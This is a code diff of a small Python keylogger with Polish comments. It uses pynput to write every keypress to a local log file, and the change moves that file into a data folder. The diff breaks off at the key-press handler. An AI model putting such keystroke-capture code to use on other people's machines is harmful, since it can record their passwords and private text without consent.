@@ -1,16 +1,25 @@
 # print("Tutaj pojawi się wkrótce kod")
 from pynput import keyboard
 import os
-FILE_PATH = os.path.join("core", "keypress_log.txt")
+
+# Ścieżka do katalogu zawierającego aktualny plik
+base_directory = os.path.dirname(os.path.abspath(__file__))
+
+# Tworzenie ścieżki do folderu `src/data`
+data_directory = os.path.join(base_directory, "..", "data")
+file_path = os.path.join(data_directory, "keypress_log.txt")
+
+# Tworzenie katalogu, jeśli go nie ma
+os.makedirs(data_directory, exist_ok=True)
 
 class MyException(Exception): pass
 
 def log_key(key):
     try:
-        with open(FILE_PATH, "a") as f:
+        with open(file_path, "a") as f:
             f.write(str(key) + "\n")
     except FileNotFoundError:
-        with open(FILE_PATH, "w") as f:
+        with open(file_path, "w") as f:
             f.write(str(key) + "\n")
 
 def on_press(key):
